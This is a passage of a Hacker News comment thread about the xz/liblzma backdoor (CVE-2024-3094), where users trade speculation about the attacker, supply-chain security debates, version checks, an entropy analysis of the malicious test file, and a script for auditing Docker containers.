--- | --- | | | |  |  | [jaromilrojo](user?id=jaromilrojo) [9 months ago](item?id=39881859)   | [root](#39874777) | [parent](#39880141) | [next](#39874793) [–]  thanks for your review! tho you are referring to the tomb-portable unfinished experiment which is about to be dismissed since cross-platform experiments with veracrypt show very bad performance. you are welcome to share a review of the tomb script, but be warned in that we use a lot of zsh specific features. It is a script that works since 15+ years so it has a discrete amount of patchwork to avoid regressions. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39874793)   | [parent](#39874777) | [prev](#39878053) | [next](#39875483) [–]  This isn't Twitter you don't have to use hashtags | | --- | --- | --- | | | |  |  | [heptazoid](user?id=heptazoid) [9 months ago](item?id=39874838)   | [root](#39874777) | [parent](#39874793) | [next](#39875483) [–]  This isn't Xitter, you don't have to tell people how to write. | | --- | --- | --- | | | |  |  | [throwaway7356](user?id=throwaway7356) [9 months ago](item?id=39875483)   | [parent](#39874777) | [prev](#39874793) | [next](#39870842) [–]  > systemd's call to dlopen() liblzma library (CVE-2024-3094) That's technically wrong, but no surprise. Anti-systemd trolls usually don't understand technical details after all. | | --- | --- | --- | | | |  |  | [jaromilrojo](user?id=jaromilrojo) [9 months ago](item?id=39875550)   | [root](#39874777) | [parent](#39875483) | [next](#39870842) [–]  It is 10 and more years that I experience such ad-hominem attacks. You are so quickly labeling an identifiable professional as troll, while hiding behind your throwaway identity, that I am confident readers will be able to discern. Meanwhile let us be precise and add more facts <https://github.com/systemd/systemd/pull/31550> Our community is swamped by people like you, so I will refrain from answering further provocations, believing I have provided enough details to back my assertion. | | --- | --- | --- | | | |  |  | [temp12237792](user?id=temp12237792) [9 months ago](item?id=39880154)   | [root](#39874777) | [parent](#39875550) | [next](#39875629) [–]  Can you explain in simple words that even a non programmer can understand, what the linked PR does? | | --- | --- | --- | | | |  |  | [throwaway7356](user?id=throwaway7356) [9 months ago](item?id=39875629)   | [root](#39874777) | [parent](#39875550) | [prev](#39880154) | [next](#39870842) [–]  That MR is not part of any released version of systemd. That is simply to verify: there has been no new systemd release. So much for the "facts". As for trolling: just look at the usual contributions from your community like <https://twitter.com/DevuanOrg/status/1619013961629995008> Excellent work with the ad-hominem attacks there. | | --- | --- | --- | | | |  |  | [lamp987](user?id=lamp987) [9 months ago](item?id=39876189)   | [root](#39874777) | [parent](#39875629) | [next](#39870842) [–]  It's already accepted and merged into master so it will be released in a future systemd release. What's your point? LP in da house? | | --- | --- | --- | | | |  |  | [throwaway7356](user?id=throwaway7356) [9 months ago](item?id=39876703)   | [root](#39874777) | [parent](#39876189) | [next](#39870842) [–]  The MR linked to would actually prevent the backdoor from working, but that doesn't stop some people from claiming it enables the backdoor. But as already said: no surprise given where the comment comes from. | | --- | --- | --- | | | |  |  | [lamp987](user?id=lamp987) [9 months ago](item?id=39955011)   | [root](#39874777) | [parent](#39876703) | [next](#39870842) [–]  That's not the point I'm replying to. You were lying and I pointed that out. | | --- | --- | --- | | | |  |  | [sn](user?id=sn) [9 months ago](item?id=39870842)   | [prev](#39874777) | [next](#39870152) [–]  For bad-3-corrupt\_lzma2.xz, the claim was that "the original files were generated with random local to my machine. To better reproduce these files in the future, a constant seed was used to recreate these files." with no indication of what the seed was. I got curious and decided to run 'ent' <https://www.fourmilab.ch/random/> to see how likely the data in the bad stream was to be random. I used some python to split the data into 3 streams, since it's supposed to be the middle one that's "bad": I used this regex to split in python, and wrote to "tmp": ```     re.split(b'\xfd7zXZ', x)  ``` I manually used dd and truncate to strip out the remaining header and footer according to the specification, which left 48 bytes: ```     $ ent tmp2 # bad file payload     Entropy = 4.157806 bits per byte.          Optimum compression would reduce the size     of this 48 byte file by 48 percent.          Chi square distribution for 48 samples is 1114.67, and randomly     would exceed this value less than 0.01 percent of the times.          Arithmetic mean value of data bytes is 51.4167 (127.5 = random).     Monte Carlo value for Pi is 4.000000000 (error 27.32 percent).     Serial correlation coefficient is 0.258711 (totally uncorrelated = 0.0).          $ ent tmp3 # urandom     Entropy = 5.376629 bits per byte.          Optimum compression would reduce the size     of this 48 byte file by 32 percent.          Chi square distribution for 48 samples is 261.33, and randomly     would exceed this value 37.92 percent of the times.          Arithmetic mean value of data bytes is 127.8125 (127.5 = random).     Monte Carlo value for Pi is 3.500000000 (error 11.41 percent).     Serial correlation coefficient is -0.067038 (totally uncorrelated = 0.0).       ``` The data does not look random. From <https://www.fourmilab.ch/random/> for the Chi-square Test, "We interpret the percentage as the degree to which the sequence tested is suspected of being non-random. If the percentage is greater than 99% or less than 1%, the sequence is almost certainly not random. If the percentage is between 99% and 95% or between 1% and 5%, the sequence is suspect. Percentages between 90% and 95% and 5% and 10% indicate the sequence is “almost suspect”." | | --- | --- | --- | | | |  |  | [supriyo-biswas](user?id=supriyo-biswas) [9 months ago](item?id=39871947)   | [parent](#39870842) | [next](#39870152) [–]  Now to be fair, such an archive could have been created with a “store” level of compression that doesn’t actually perform any compression. | | --- | --- | --- | | | |  |  | [sn](user?id=sn) [9 months ago](item?id=39876228)   | [root](#39870842) | [parent](#39871947) | [next](#39870152) [–]  My reading of the commit message is they're claiming the "data" should look random. | | --- | --- | --- | | | |  |  | [0x0](user?id=0x0) [9 months ago](item?id=39870152)   | [prev](#39870842) | [next](#39872175) [–]  All these older (4.x, 5.0.x etc) releases that were suddenly uploaded a few months ago should probably also be considered suspect: [https://github.com/tukaani-project/tukaani-project.github.io...](https://github.com/tukaani-project/tukaani-project.github.io/commit/071a8acf097e11b659f6d7eb0f3b2e5e8934de0e) | | --- | --- | --- | | | |  |  | [kn100](user?id=kn100) [9 months ago](item?id=39872175)   | [prev](#39870152) | [next](#39873260) [–]  Here's a handy bash script I threw together to audit any docker containers you might be running on your machine. It's hacky, but will quickly let you know what version, if any, of xz, is running in your docker containers. ``` #!/bin/bash # Get list of all running Docker containers containers=$(docker ps --format "{{.Names}}") # Loop through each container for container in $containers; do # Get container image image=$(docker inspect --format='{{.Config.Image}}' "$container") ```     # Execute xz --version inside the container     version=$(docker exec "$container" xz --version)      # Write container name, image, and command output to a text file     echo "Container: $container" >> docker_container_versions.txt     echo "Image: $image" >> docker_container_versions.txt     echo "xz Version:" >> docker_container_versions.txt     echo "$version" >> docker_container_versions.txt     echo "" >> docker_container_versions.txt  ``` done echo "Output written to docker\_container\_versions.txt" ``` | | --- | --- | --- | | | |  |  | [Roark66](user?id=Roark66) [9 months ago](item?id=39873260)   | [prev](#39872175) | [next](#39867009) [–]  Sadly this is exactly one of the cases where open source is much more vulnerable to a state actor sponsored attack than proprietary software. (it is also easier to find such backdoors in OS software but that's BTW) Why? Well, consider this, to "contribute" to a proprietary project you need to get hired by a company, go through their he. Also they have to be hiring in the right team etc. Your operative has to be in a different country, needs a CV that checks out, passports/ids are checked etc. But to contribute to an OS project? You just need an email address. Your operative sends good contributions until they build trust, then they start introducing backdoors in the part of the code "no one, but them understands". The cost of such attack is a lot lower for a state actor so we have to assume every single OS project that has a potential to get back doored had many attempts of doing so. (proprietary software too, but as mentioned, this is much more expensive) So what is the solution? IDK, but enforcing certain "understandability" requirements can be a part of it. | | --- | --- | --- | | | |  |  | [alufers](user?id=alufers) [9 months ago](item?id=39873413)   | [parent](#39873260) | [next](#39874649) [–]  Is that true? Large companies producing software usually have bespoke infra, which barely anyone monitors. See: the Solarwinds hack. Similarly to the xz compromise they added the a Trojan to the binary artifacts by hijacking the build infrastructure. According to Wikipedia "around 18,000 government and private users downloaded compromised versions", it took almost a year for somebody to detect the trojan. Thanks to the tiered updates of Linux distros, the backdoor was caught in testing releases, and not in stable versions. So only a very low percentage of people were impacted. Also the whole situation happened because distros used the tarball with a "closed source" generated script, instead of generating it themselves from the git repo. Again proving that it's easier to hide stuff in closed source software that nobody inspects. Same with getting hired. Don't companies hire cheap contractors from Asia? There it would be easy to sneak in some crooked or even fake person to do some dirty work. Personally I was even emailed by a guy from China who asked me if I was willing to "borrow" him my identity so he could work in western companies, and he would share the money with me. Of course I didn't agree, but I'm not sure if everybody whose email he found on Github did. [https://en.wikipedia.org/wiki/2020\_United\_States\_federal\_gov...](https://en.wikipedia.org/wiki/2020_United_States_federal_government_data_breach) | | --- | --- | --- | | | |  |  | [throwaway7356](user?id=throwaway7356) [9 months ago](item?id=39874649)   | [parent](#39873260) | [prev](#39873413) | [next](#39867009) [–]  > Well, consider this, to "contribute" to a proprietary project you need to get hired by a company, go through their he. Or work for a third-party company that gets access to critical systems without any checks. See for example the incident from 2022 here: [https://en.wikipedia.org/wiki/Okta,\_Inc](https://en.wikipedia.org/wiki/Okta%2C_Inc). Or a third-party that rents critical infrastructure to the company (Cloud, SaaS solutions). | | --- | --- | --- | | | |  |  | [joveian](user?id=joveian) [9 months ago](item?id=39880324)   | [root](#39873260) | [parent](#39874649) | [next](#39867009) [–]  Or exactly this kind of backdoor in open source but target proprietary software. I don't know of any survey but I'd be surprised if less than half of proprietary software used open source software one way or another and not surprised if it was quite a bit more than that. | | --- | --- | --- | | | |  |  | [Scaevolus](user?id=Scaevolus) [9 months ago](item?id=39867009)   | [prev](#39873260) | [next](#39866168) [–]  It's wild that this could have laid dormant for far longer if the exploit was better written-- if it didn't spike slow down logins or disturb valgrind. | | --- | --- | --- | | | |  |  | [lpapez](user?id=lpapez) [9 months ago](item?id=39866168)   | [prev](#39867009) | [next](#39868756) [–]  So many security companies publishing daily generic blog posts about "serious supply chain compromises" in various distros on packages with 0 downloads, and yet it takes a developer debugging performance issues to find an actual compromise. I worked in the software supply chain field and cannot resist feeling the entire point of that industry is to make companies pay for a security certificate so you can shift the blame onto someone else when things go wrong. | | --- | --- | --- | | | |  |  | [r0ckarong](user?id=r0ckarong) [9 months ago](item?id=39866218)   | [parent](#39866168) | [next](#39866274) [–]  > cannot resist feeling the entire point of that industry is to make companies pay for a security certificate so you can shift the blame onto someone else when things go wrong. That's the entire point. You did everything you could by getting someone else look at it and saying it's fine. | | --- | --- | --- | | | |  |  | [numpad0](user?id=numpad0) [9 months ago](item?id=39870997)   | [root](#39866168) | [parent](#39866218) | [next](#39866274) [–]  This needs a Rust joke. You know, the problem with the whole certification charade is it slows down jobs and prevents \_\_actual\_problems getting evaluated. But is it safe? | | --- | --- | --- | | | |  |  | [CableNinja](user?id=CableNinja) [9 months ago](item?id=39866274)   | [parent](#39866168) | [prev](#39866218) | [next](#39866270) [–]  Thats basically the whole point actually... A company pays for insurance for the business. The insurance company says sure we will insure you, but you need to go through audits A B and C, and you need certifications X and Y to be insured by us. Those audits are often industry dependent, mostly for topics like HIPAA, PCI, SOC, etc. Insurance company hears about supply chain attacks. Declares that insured must have supply chain validation. Company goes and gets a shiny cert. Now when things go wrong, the company can point to the cert and go "it wasnt us, see we have the cert you told us to get and its up to date". And the company gets to wash their hands of liability (most of the time). | | --- | --- | --- | | | |  |  | [landownersubgrp](user?id=landownersubgrp) [9 months ago](item?id=39918830)   | [root](#39866168) | [parent](#39866274) | [next](#39876852) [–]  What you describe is a normal process in order to minimise damage from attacks. The damage of hacking is ultimately property damage. The procedures you've described allow you to minimise it. And that's a good thing. | | --- | --- | --- | | | |  |  | [77pt77](user?id=77pt77) [9 months ago](item?id=39876852)   | [root](#39866168) | [parent](#39866274) | [prev](#39918830) | [next](#39866270) [–]  > And the company gets to wash their hands of liability (most of the time). Certification theater. It's completely performative. | | --- | --- | --- | | | |  |  | [keepamovin](user?id=keepamovin) [9 months ago](item?id=39866270)   | [parent](#39866168) | [prev](#39866274) | [next](#39866228) [–]  If you installed xz on macOS using brew, then you have ```   xz (XZ Utils) 5.6.1   liblzma 5.6.1  ``` which are within the release target for the vuln. As elsewhere in these comments, people say macOS effect is uncertain. If concerned you can revert to 5.4.6 with ```   brew upgrade xz ``` | | --- | --- | --- | | | |  |  | [pjl](user?id=pjl) [9 months ago](item?id=39867297)   | [root](#39866168) | [parent](#39866270) | [next](#39871783) [–]  Similarly if you're using MacPorts, make sure to sync and upgrade xz if you have it installed. 5.6.1 was available for a few days and just rolled back ~20 minutes ago: [https://github.com/macports/macports-ports/commit/a1388aee09...](https://github.com/macports/macports-ports/commit/a1388aee09c9e921e3a9d47cf9d37e5d3f3c10ad) | | --- | --- | --- | | | |  |  | [quinncom](user?id=quinncom) [9 months ago](item?id=39871783)   | [root](#39866168) | [parent](#39866270) | [prev](#39867297) | [next](#39866495) [–]  Thank you for this tip. `brew upgrade xz` worked. I was going to uninstall but it's used by *so many things*… ```      brew uninstall xz     Error: Refusing to uninstall /opt/homebrew/Cellar/xz/5.6.1     because it is required by aom, composer, curl, ffmpeg, gcc, gd, ghostscript, glib, google-cloud-sdk, grc, harfbuzz, httpie, img2pdf, jbig2enc, jpeg-xl, leptonica, libarchive, libavif, libheif, libraw, libtiff, libzip, little-cms2, numpy, ocrmypdf, openblas, openjpeg, openvino, php, pillow, pipx, pngquant, poppler, python@3.11, python@3.12, rsync, tesseract, tesseract-lang, unpaper, webp, wp-cli, yt-dlp and zstd, which are currently installed. ``` | | --- | --- | --- | | | |  |  | [keepamovin](user?id=keepamovin) [9 months ago](item?id=39872607)   | [root](#39866168) | [parent](#39871783) | [next](#39866495) [–]  You're welcome! | | --- | --- | --- | | | |  |  | [neodypsis](user?id=neodypsis) [9 months ago](item?id=39866495)   | [root](#39866168) | [parent](#39866270) | [prev](#39871783) | [next](#39866228) [–]  It's been reverted now: [https://github.com/Homebrew/homebrew-core/blob/9a0603b474804...](https://github.com/Homebrew/homebrew-core/blob/9a0603b474804ef76cef17cf1bc90397996088bb/Formula/x/xz.rb) | | --- | --- | --- | | | |  |  | [keepamovin](user?id=keepamovin) [9 months ago](item?id=39871827)   | [root](#39866168) | [parent](#39866495) | [next](#39866228) [–]  Yeah it was when I posted the comment too. That's why you could type brew upgrade xz and it went back to 5.4.6 I guess? But it might have been around that time, cutting it fine, not out for everybody. I don't know. Comment race condition haha! :) | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39866228)   | [parent](#39866168) | [prev](#39866270) | [next](#39867909) [–]  > the entire point of that industry is to make companies pay for a security certificate so you can shift the blame onto someone else when things go wrong. That is actually a major point of a lot of corporate security measures (shifting risk) | | --- | --- | --- | | | |  |  | [landownersubgrp](user?id=landownersubgrp) [9 months ago](item?id=39918896)   | [root](#39866168) | [parent](#39866228) | [next](#39867909) [–]  And that's a good thing. | | --- | --- | --- | | | |  |  | [markus\_zhang](user?id=markus_zhang) [9 months ago](item?id=39867909)   | [parent](#39866168) | [prev](#39866228) | [next](#39868756) [–]  That's the entire point of certification, and any certification at all. Certification does not guarantee performance. Actually, I would always cast a suspect glance to anyone who is FOCUSED on getting certification after certification without any side project. | | --- | --- | --- | | | |  |  | [gouggoug](user?id=gouggoug) [9 months ago](item?id=39868756)   | [prev](#39866168) | [next](#39876647) [–]  List of pull request requesting the updating to liblzma 5.6.0 [0] I wonder what amount of scrutiny all the accounts that proposed the upgrade should be put under. [0] <https://github.com/search?q=liblzma+5.6.0&type=pullrequests> | | --- | --- | --- | | | |  |  | [snickerer](user?id=snickerer) [9 months ago](item?id=39876647)   | [prev](#39868756) | [next](#39870083) [–]  When I search for "digital masquerade" on Google, the first result is a book with this title from the author Jia Tan. I assume that is how the attackers got their fake name. Or they think using this author's name is a joke. | | --- | --- | --- | | | |  |  | [dlenski](user?id=dlenski) [9 months ago](item?id=39870083)   | [prev](#39876647) | [next](#39870555) [–]  A lot of software (including <https://gitlab.com/openconnect/openconnect> of which I'm a maintainer) uses libxml2, which in turn transitively links to libzma, using it to load and store *compressed* XML. I'm not \*too\* worried about OpenConnect given that we use `libxml2` only to read and parse *uncompressed* XML… But I am wondering if there has been any statement from libxml2 devs (they're under the GNOME umbrella) about potential risks to libxml2 and its users. | | --- | --- | --- | | | |  |  | [enedil](user?id=enedil) [9 months ago](item?id=39870672)   | [parent](#39870083) | [next](#39870463) [–]  This doesn't matter, if libxml2 loads .so and the library is malicious, you are already potentially compromised, as it is possible to run code on library load. | | --- | --- | --- | | | |  |  | [bananapub](user?id=bananapub) [9 months ago](item?id=39870463)   | [parent](#39870083) | [prev](#39870672) | [next](#39870555) [–]  > only to read and parse uncompressed XML… how does libxml2 know to decompress something? does it require you, as the caller, to explicitly tell it to? or does it look at the magic bytes or filename or mimetype or something? | | --- | --- | --- | | | |  |  | [dlenski](user?id=dlenski) [9 months ago](item?id=39913915)   | [root](#39870083) | [parent](#39870463) | [next](#39870555) [–]  > how does libxml2 know to decompress something? > > does it require you, as the caller, to explicitly tell it to? In the entry point/function that we use, `xmlReadMemory` ([https://gnome.pages.gitlab.gnome.org/libxml2/devhelp/libxml2...](https://gnome.pages.gitlab.gnome.org/libxml2/devhelp/libxml2-parser.html#xmlReadMemory)), it doesn't handle compressed XML at all. But there are indeed others where it attempts to auto-detect compression, although as I understand it from the docs only ZLib compression is autodetected… though I suspect these may be out-of-date and it may autodetect any/all compiled -in compression algorithms. Regardless, the fact that it links with liblzma is cause for concern, given the mechanism of operation of the liblzma/xz backdoor. | | --- | --- | --- | | | |  |  | [afh1](user?id=afh1) [9 months ago](item?id=39870555)   | [prev](#39870083) | [next](#39866105) [–]  Potentially malicious commit by same author on libarchive: <https://github.com/libarchive/libarchive/pull/1609> | | --- | --- | --- | | | |  |  | [youainti](user?id=youainti) [9 months ago](item?id=39866105)   | [prev](#39870555) | [next](#39873725) [–]  Summary: "The upstream xz repository and the xz tarballs have been backdoored." It is known to be in version 5.6.0 and 5.6.1, and the obfuscated code is found in the test directory. | | --- | --- | --- | | | |  |  | [Randalthorro](user?id=Randalthorro) [9 months ago](item?id=39873725)   | [prev](#39866105) | [next](#39866068) [–]  Since GitHub disabled the repos.. I uploaded all GitHub Events from the two suspected users and from their shared project repo as easy to consume CSV files: <https://github.com/emirkmo/xz-backdoor-github> For those who want to see the GitHub events (commits, comments, pull\_requets, diffs, etc.) | | --- | --- | --- | | | |  |  | [lostmsu](user?id=lostmsu) [9 months ago](item?id=39882196)   | [parent](#39873725) | [next](#39866068) [–]  Better make a torrent out of them. | | --- | --- | --- | | | |  |  | [yogorenapan](user?id=yogorenapan) [9 months ago](item?id=39866068)   | [prev](#39873725) | [next](#39866421) [–]  Very strange behavior from the upstream developers. Possible government involvement? I have a feeling LANG is checked to target servers from particular countries | | --- | --- | --- | | | |  |  | [acheong08](user?id=acheong08) [9 months ago](item?id=39866188)   | [parent](#39866068) | [next](#39866504) [–]  One thing to note is that the person that added the commits only started contributing around late 2022 and appears to have a Chinese name. Might be required by law to plant the backdoor. That would be quite scary considering they have contributed to a wide variety of projects including C++ [https://learn.microsoft.com/en-us/cpp/overview/whats-new-cpp...](https://learn.microsoft.com/en-us/cpp/overview/whats-new-cpp-docs?view=msvc-170) | | --- | --- | --- | | | |  |  | [yorwba](user?id=yorwba) [9 months ago](item?id=39866479)   | [root](#39866068) | [parent](#39866188) | [next](#39873335) [–]  I don't think you need to worry about the C++ contribution: [https://github.com/MicrosoftDocs/cpp-docs/commit/9a96311122a...](https://github.com/MicrosoftDocs/cpp-docs/commit/9a96311122acd6c6de1e2624cd0f95655fac6500) | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [9 months ago](item?id=39866911)   | [root](#39866068) | [parent](#39866479) | [next](#39866954) [–]  This does make me wonder how much they made a deliberate effort to build an open source portfolio so they’d look more legitimate when time came to mount an attack. It seems expensive but it’s probably not really much at the scale of an intelligence agency. | | --- | --- | --- | | | |  |  | [kube-system](user?id=kube-system) [9 months ago](item?id=39867394)   | [root](#39866068) | [parent](#39866911) | [next](#39867081) [–]  What's the salary for a software engineer in urban China? 60-80k/yr USD? Two years of that salary is cheaper than a good single shoulder fired missile. Seems like a pretty cheap attack vector to me. A Javelin is a quarter million per pop and they can only hit one target. | | --- | --- | --- | | | |  |  | [alwayslikethis](user?id=alwayslikethis) [9 months ago](item?id=39870470)   | [root](#39866068) | [parent](#39867394) | [next](#39869532) [–]  They are paid much less than that. However, American weapons are also far overpriced due to high labor costs, among other things. The Chinese probably have cheaper weapons. | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [9 months ago](item?id=39869532)   | [root](#39866068) | [parent](#39867394) | [prev](#39870470) | [next](#39883600) [–]  Yeah, exactly - when your army is measured in the millions, picking n hundred with technical aptitude is basically a rounding error. | | --- | --- | --- | | | |  |  | [catkitcourt](user?id=catkitcourt) [9 months ago](item?id=39883600)   | [root](#39866068) | [parent](#39867394) | [prev](#39869532) | [next](#39867081) [–]  Unless the payment is performed by foreign entity (which means a US employer is hiring a Chinese hacker), it's not a wise choice to do currency exchange when measuring salary, because it would erase other facts affecting salary, like CPI or housing price. Apart from (both visible and invisible) taxes, I expect a senior programmer would earn ~500-700k CNY per year. Game programmers may reach up to 200k. For a team able to perform such attack, 1M/yr avg. might be reasonable. But if this is not a state-sponsored attack, I can't find enough interest. And, if this is state-backed...contractor or some dishonest officials would a huge part, so the real cost might be >2M/yr. Considering you can get nothing during 2 year's lurking I doubt if it's feasible enough. | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39867081)   | [root](#39866068) | [parent](#39866911) | [prev](#39867394) | [next](#39866954) [–]  If I were doing it, I'd have a number of these "burner committers" ready to go when needed. If I were doing it AND amoral, I'd also be willing to find and compromise committers in various ways. | | --- | --- | --- | | | |  |  | [hartator](user?id=hartator) [9 months ago](item?id=39866954)   | [root](#39866068) | [parent](#39866479) | [prev](#39866911) | [next](#39873335) [–]  Until you figure there are very subtle unicode changes in the URL that don’t diff on GitHub. :) | | --- | --- | --- | | | |  |  | [8organicbits](user?id=8organicbits) [9 months ago](item?id=39873335)   | [root](#39866068) | [parent](#39866188) | [prev](#39866479) | [next](#39875351) [–]  > appears to have a Chinese name Given the complexity of the attack, I'd assume the name is fake. | | --- | --- | --- | | | |  |  | [dotty-](user?id=dotty-) [9 months ago](item?id=39875351)   | [root](#39866068) | [parent](#39866188) | [prev](#39873335) | [next](#39873364) [–]  The contribution to C++ is just a simple markdown change: <https://github.com/MicrosoftDocs/cpp-docs/pull/4716> C++ is fine. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39929409)   | [root](#39866068) | [parent](#39875351) | [next](#39873364) [–]  Also it's not a contribution to C++ but only one of Microsoft's projects around C++. | | --- | --- | --- | | | |  |  | [bdd8f1df777b](user?id=bdd8f1df777b) [9 months ago](item?id=39873364)   | [root](#39866068) | [parent](#39866188) | [prev](#39875351) | [next](#39866627) [–]  I would think a Chinese state hacker would not assume a Chinese name, just in case he was discovered like now. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39929421)   | [root](#39866068) | [parent](#39873364) | [next](#39866627) [–]  But your reaction being a common one would make a Chinese name the best pick for a Chines agent wanting to hide their country affiliation. | | --- | --- | --- | | | |  |  | [ComputerGuru](user?id=ComputerGuru) [9 months ago](item?id=39866627)   | [root](#39866068) | [parent](#39866188) | [prev](#39873364) | [next](#39866504) [–]  No one is being “required by law” to add vulnerabilities, it’s more likely they are foreign agents to begin with. | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39867108)   | [root](#39866068) | [parent](#39866627) | [next](#39868730) [–]  Depends on the law and where you are. Publicly we have <https://www.eff.org/issues/national-security-letters/faq> and it's likely that other requests have occurred from time to time, even in the USA. | | --- | --- | --- | | | |  |  | [computerfriend](user?id=computerfriend) [9 months ago](item?id=39868730)   | [root](#39866068) | [parent](#39866627) | [prev](#39867108) | [next](#39866504) [–]  > No one is being “required by law” to add vulnerabilities This is absolutely not the case in many parts of the world. | | --- | --- | --- | | | |  |  | [anarazel](user?id=anarazel) [9 months ago](item?id=39866504)   | [parent](#39866068) | [prev](#39866188) | [next](#39866421) [–]  LANG only needs to have *some* value, the concrete value does not seem to matter. | | --- | --- | --- | | | |  |  | [ParetoOptimal](user?id=ParetoOptimal) [9 months ago](item?id=39866421)   | [prev](#39866068) | [next](#39869118) [–]  If you have a recently updated NixOS unstable it has the affected version: ```     $ xz --version     xz (XZ Utils) 5.6.1     liblzma 5.6.1  ``` EDIT: I've been informed on the NixOS matrix that they are 99% sure NixOS isn't affected, based on conversations in #security:nixos.org | | --- | --- | --- | | | |  |  | [mik1998](user?id=mik1998) [9 months ago](item?id=39869118)   | [prev](#39866421) | [next](#39866119) [–]  Personally, I use lzip ever since I read <https://www.nongnu.org/lzip/xz_inadequate.html> Seems like the complexity of XZ has backfired severely, as expected. | | --- | --- | --- | | | |  |  | [bananapub](user?id=bananapub) [9 months ago](item?id=39870469)   | [parent](#39869118) | [next](#39866119) [–]  > Seems like the complexity of XZ has backfired severely, as expected. this is a very bad reading of the current situation. | | --- | --- | --- | | | |  |  | [ta8645](user?id=ta8645) [9 months ago](item?id=39871794)   | [root](#39869118) | [parent](#39870469) | [next](#39866119) [–]  This kind of shallow dismissal is really unhelpful to those of us trying to follow the argument. You take a tone of authoritative expert, without giving any illuminating information to help outsiders judge the merit of your assertion. Why is it a very bad reading of the current situation? What is a better reading? | | --- | --- | --- | | | |  |  | [bananapub](user?id=bananapub) [9 months ago](item?id=39873501)   | [root](#39869118) | [parent](#39871794) | [next](#39871949) [–]  I am not sure I agree that every low quality post needs a detailed rebuttal? HN couldn't function under such rules. as to the specific comment: > Seems like the complexity of XZ has backfired severely, as expected. to summarise: someone found a project with a vulnerable maintenance situation, spent *years* getting involved in a project, then got commit rights, and then commited a backdoor in some binaries and the build system, then got sock puppets to agitate for OSes to adopt the backdoored code. the comment I replied to made a "shallow" claim of complexity without any details, so let's look at some possible interpretations: - code complexity - doesn't seem super relevant - the attacker hide a highly obfuscated backdoor in a binary test file and committed it - approximately no one is ever going to catch such things without a *process* step of requiring binaries be generatable in a reasonable-looking and hopefully-hard-to-backdoor kind of way. cryptographers are good at this: <https://en.wikipedia.org/wiki/Nothing-up-my-sleeve_number> - build complexity - sure, but it's auto\*, that's very common. - organisational complexity - the opposite is the case. it had one guy maintaining it, who asked for help. - data/file format complexity - doesn't seem relevant unless it turns out the obfuscation method used was particularly easy for this format, but even in that case, you'd think others would be vulnerable to something equivalent perhaps OP had some other thing in mind, but then they could have said that, instead of making a crappy comment. | | --- | --- | --- | | | |  |  | [davispw](user?id=davispw) [9 months ago](item?id=39871949)   | [root](#39869118) | [parent](#39871794) | [prev](#39873501) | [next](#39933043) [–]  To summarize the article, the back door is introduced through build scripts and binaries distributed as “test” data. Very little to do with the complexity or simplicity of xz; more that it was a dependency of critical system binaries (systemd) and ripe for hostile takeover of the maintainer role. | | --- | --- | --- | | | |  |  | [psi-jack](user?id=psi-jack) [9 months ago](item?id=39933043)   | [root](#39869118) | [parent](#39871794) | [prev](#39871949) | [next](#39871959) [–]  Totally agree. This aggressive stance about xz suddenly is not even helpful to anyone. xz has been and will always be my preferred compression algorithm for times to come, despite this pitfall of really insane levels of social engineering. I feel for the author having burn out and such, but in all fairness, xz is one of the best compression formats of today's time and still going. | | --- | --- | --- | | | |  |  | [supriyo-biswas](user?id=supriyo-biswas) [9 months ago](item?id=39871959)   | [root](#39869118) | [parent](#39871794) | [prev](#39933043) | [next](#39866119) [–]  Introducing a back door is not the same thing as a badly designed file format. | | --- | --- | --- | | | |  |  | [buildbot](user?id=buildbot) [9 months ago](item?id=39866119)   | [prev](#39869118) | [next](#39872827) [–]  This potentially could be a full automated rootkit type breach right? Great - is any system with 5.6.1 possibly vulnerable? Also super weird a contributor thought they could slip this in and not have it be noticed at some point. It may point to burning that person (aka, they go to jail) for whatever they achieved with this. (And whoever they are…) | | --- | --- | --- | | | |  |  | [pdimitar](user?id=pdimitar) [9 months ago](item?id=39872827)   | [prev](#39866119) | [next](#39870757) [–]  This was only a matter of time. Open source projects are under-staffed, maintainers are overworked and burned out, and everyone relies on the goodwill of all actors. Obviously a bad actor will make use of these conditions and the assumption of good will. We need automated tooling to vet for stuff like this. And maybe migrate away from C/C++ while we are at it because they don't make such scanning easy at all. | | --- | --- | --- | | | |  |  | [devttyeu](user?id=devttyeu) [9 months ago](item?id=39870757)   | [prev](#39872827) | [next](#39868931) [–]  Wouldn’t be surprised that the ssh auth being made slower was deliberate - that makes it fairly easy to index all open ssh servers on the internet, then to see which ones get slower to fail preauth as they install the backdoor | | --- | --- | --- | | | |  |  | [bananapub](user?id=bananapub) [9 months ago](item?id=39868931)   | [prev](#39870757) | [next](#39869343) [–]  people are mis-reading the Debian bug report: <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067708> it wasn't the apparently newly-created identity "Hans Jansen" just *asking* for a new version to be uploaded, it was "Hans Jansen" *providing* a new version to be uploaded as a non-maintainer-upload - Debian-speak for "the maintainer is AWOL, someone else is uploading their package". if "Hans Jansen" is another attacker then they did this cleverly, providing the new - compromised - upstream tarballs in an innocent-looking way and avoiding anyone examining the upstream diff. | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [9 months ago](item?id=39869343)   | [prev](#39868931) | [next](#39870837) [–]  Looking at how many requests to update to the backdoored version have been made, I wonder if the fact that many people (including developers) have been conditioned to essentially accept updates as "always-good" is a huge contributing factor in how easy it is to spread something like this. The known unknowns can be better than the unknown unknowns. | | --- | --- | --- | | | |  |  | [frenchman99](user?id=frenchman99) [9 months ago](item?id=39872935)   | [parent](#39869343) | [next](#39870837) [–]  Totally agree. With things like Dependabot encouraged by GitHub, people now get automated pull requests for dependency updates, increasing the speed of propagation of such vulnerabilities. | | --- | --- | --- | | | |  |  | [A1kmm](user?id=A1kmm) [9 months ago](item?id=39870837)   | [prev](#39869343) | [next](#39867428) [–]  Looks like GitHub has suspended access to the repository, which while it protects against people accidentally compiling and using the code, but certainly complicates forensic analysis for anyone who doesn't have a clone or access to history (which is what I think a lot of people will be doing now to understand their exposure). | | --- | --- | --- | | | |  |  | [A1kmm](user?id=A1kmm) [9 months 